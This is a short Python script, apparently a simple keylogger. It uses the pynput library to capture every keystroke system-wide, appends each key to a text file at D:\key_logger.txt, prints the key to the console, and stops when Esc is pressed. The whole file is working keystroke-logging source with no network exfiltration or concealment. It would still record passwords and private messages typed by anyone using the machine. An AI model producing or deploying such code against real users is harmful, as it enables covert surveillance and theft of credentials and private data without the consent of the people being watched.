from pynput.keyboard import Key, Listener

text = []
keys_list = []
unique_keys = 0
total_keys = 0

file_location = "D:\\key_logger.txt"

def Write_on_file(file_location, info):
    with open(file_location, "a", encoding='utf-8') as file:
        file.write("key information: " + str(info) + '\n')
        file.close()

def Clear_file(file_location):
    try:
        with open(file_location, "w", encoding='utf-8') as file:
            file.truncate(0)
            file.close()
    except FileNotFoundError as err:
        pass

def On_press(key):
    global keys_list, unique_keys, total_keys, file_location
    #print(type(info))
    if key not in keys_list:
        keys_list.append(key)
        unique_keys += 1
    text.append(key)
    total_keys += 1
    Write_on_file(file_location, key)
    print("{0} was pressed".format(key))

def On_release(key):
    global keys_list, unique_keys, total_keys
    if key == Key.esc:
        if key not in keys_list:
            keys_list.append(key)
            unique_keys += 1
        total_keys += 1
        #Write_on_file(file_location, key)
        print("execution of keylogger was shut down")
        return False

if __name__ == "__main__":
    Clear_file(file_location)
    with Listener(on_press=On_press, on_release=On_release) as listener:
        listener.join()